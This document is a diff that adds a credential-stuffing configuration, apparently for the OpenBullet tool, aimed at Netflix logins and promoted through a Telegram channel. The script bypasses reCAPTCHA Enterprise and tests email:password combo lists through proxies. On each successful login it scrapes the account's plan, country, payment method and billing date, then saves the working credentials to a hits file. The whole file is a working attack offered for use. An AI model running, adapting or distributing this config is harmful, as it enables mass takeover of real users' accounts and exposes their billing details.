@@ -1,0 +1,154 @@
+[SETTINGS]
+{
+  "Name": "Netflix",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2020-12-19T23:56:06.9934219+03:30",
+  "AdditionalInfo": "Telegram Channel: T.me/BruteForce | Needs HQ Proxy | ReCaptcha Bypassed | Full Capture | CPM Rate: 20-500",
+  "RequiredPlugins": [],
+  "Author": "@TheOwn",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Get1 REQUEST GET "https://www.netflix.com/Login" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Ban OR 
+    KEY "Sorry, we&#39;re having trouble with your request. You&#39;ll find lots to explore on the home page." 
+
+#AuthURL PARSE "<SOURCE>" LR "authURL\" value=\"" "\"/" -> VAR "AuthURL" 
+
+#Auth FUNCTION URLEncode "<AuthURL>" -> VAR "Auth" 
+
+#Get2 REQUEST GET "https://www.google.com/recaptcha/enterprise/anchor?ar=1&k=6Lf8hrcUAAAAAIpQAFW2VFjtiYnThOjZOA5xvLyR&co=aHR0cHM6Ly93d3cubmV0ZmxpeC5jb206NDQz&hl=en&v=Y5tQ3lKwn1XL5hGgLz1kR4-1&size=invisible&cb=cpphtg1lth6a" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#C PARSE "<SOURCE>" LR "type=\"hidden\" id=\"recaptcha-token\" value=\"" "\">" -> VAR "C" 
+
+#Recaptcha REQUEST POST "https://www.google.com/recaptcha/api2/reload?k=6Lf8hrcUAAAAAIpQAFW2VFjtiYnThOjZOA5xvLyR" 
+  CONTENT "v=Y5tQ3lKwn1XL5hGgLz1kR4-1&reason=q&c=<C>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Token PARSE "<SOURCE>" LR "[\"rresp\",\"" "\"" -> VAR "Token" 
+
+#US FUNCTION URLEncode "<USER>" -> VAR "US" 
+
+#PS FUNCTION URLEncode "<PASS>" -> VAR "PS" 
+
+#Length FUNCTION Length "userLoginId=<US>&password=<PS>&rememberMe=true&flow=websiteSignUp&mode=login&action=loginAction&withFields=rememberMe%2CnextPage%2CuserLoginId%2Cpassword%2CcountryCode%2CcountryIsoCode%2CrecaptchaResponseToken%2CrecaptchaError%2CrecaptchaResponseTime&authURL=<Auth>&nextPage=&showPassword=&countryCode=%2B1&countryIsoCode=CA&recaptchaResponseToken=<Token>&recaptchaResponseTime=1034" -> VAR "Length" 
+
+#Login REQUEST POST "https://www.netflix.com/Login" 
+  CONTENT "userLoginId=<US>&password=<PS>&rememberMe=true&flow=websiteSignUp&mode=login&action=loginAction&withFields=rememberMe%2CnextPage%2CuserLoginId%2Cpassword%2CcountryCode%2CcountryIsoCode%2CrecaptchaResponseToken%2CrecaptchaError%2CrecaptchaResponseTime&authURL=<Auth>&nextPage=&showPassword=&countryCode=%2B1&countryIsoCode=CA&recaptchaResponseToken=<Token>&recaptchaResponseTime=1034" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: <Length>" 
+  HEADER "Host: www.netflix.com" 
+  HEADER "Origin: https://www.netflix.com" 
+  HEADER "Referer: https://www.netflix.com/Login" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Sorry, we can't find an account with this email address." 
+    KEY "Incorrect password." 
+  KEYCHAIN Success OR 
+    KEY "profile-name" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "Welcome back" 
+
+#Cookie PARSE "<SOURCE>" LR "\"flwssn\":\"" "\"" -> VAR "Cookie" 
+
+#info REQUEST GET "https://www.netflix.com/YourAccount" 
+  
+  COOKIE "flwssn: <Cookie>" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Host: www.netflix.com" 
+  HEADER "Referer: https://www.netflix.com/browse" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1" 
+
+#Sub PARSE "<SOURCE>" LR "\"currentPlanName\":\"" "\"" -> VAR "Sub" 
+
+#Plan FUNCTION Translate 
+  KEY "\\u03A4\\u03C5\\u03C0\\u03B9\\u03BA\\u03CC" VALUE "Basic" 
+  KEY "B\\u00E1sico" VALUE "Basic" 
+  KEY "u57FAu672C" VALUE "Basic" 
+  KEY "\\" VALUE "" 
+  KEY "Est\\u00E1ndar" VALUE "Standard" 
+  KEY "Bu00E1sico" VALUE "Basic" 
+  "<Sub>" -> CAP "Plan" 
+
+#Period_Of_Time PARSE "<SOURCE>" LR ",\"planDuration\":\"" "\",\"localizedPlanName" CreateEmpty=FALSE -> CAP "Period Of Time" 
+
+#Free_Trial PARSE "<SOURCE>" LR "\"isInFreeTrial\":" "," -> CAP "Trial" 
+
+#Country PARSE "<SOURCE>" LR "\",\"currentCountry\":\"" "\"" -> CAP "Country" 
+
+#DVD PARSE "<SOURCE>" LR "\"isDVD\":" "," -> CAP "DVD" 
+
+#HD PARSE "<SOURCE>" LR "\"hasHD\":" "," -> CAP "HD" 
+
+#Ultra_HD PARSE "<SOURCE>" LR "\"hasUHD\":" "," -> CAP "Ultra HD" 
+
+#Stream PARSE "<SOURCE>" LR "\"maxStreams\":" "," -> CAP "Stream" 
+
+#Billing PARSE "<SOURCE>" LR "\"nextBillingDate\":\"" "\"" -> VAR "Billing" 
+
+#Nex_Billing FUNCTION Replace "\\x2F" "/" "<Billing>" -> CAP "Next Billing" 
+
+#Billing PARSE "<SOURCE>" LR "data-uia=\"payment-text\">" "</span" CreateEmpty=FALSE -> CAP "Payment Methode" 
+
+#Credit FUNCTION Constant " T.me/BruteForce " -> CAP " Telegram Channel:" 
+
+#SSS UTILITY File "Netflix Hits.txt" AppendLines "<<<<<<=Account=>>>>>>\\nCombo: <USER>:<PASS>\\nEmail:  <USER>\\nPassword: <PASS>\\n<<<<<<<<<<<=Information=>>>>>>>>>>\\nPlan: <Plan>\\nPeriod Of Time: <Period Of Time>\\nCountry: <Country>\\nFree Trial: <Trial>\\nDVD: <DVD>\\nMax Streams: <Stream>\\nHas HD: <HD>\\nHas Ultra HD: <Ultra HD>\\nPayment Methode: <Payment Methode>\\nNext Billing Date: <Next Billing>\\n\\n\\n<<<<<<=Credit=>>>>>>\\nConfiged By @TheOwn\\nTelegram Channel: @BruteForce\\n=================================================" -> VAR "Save" 
+
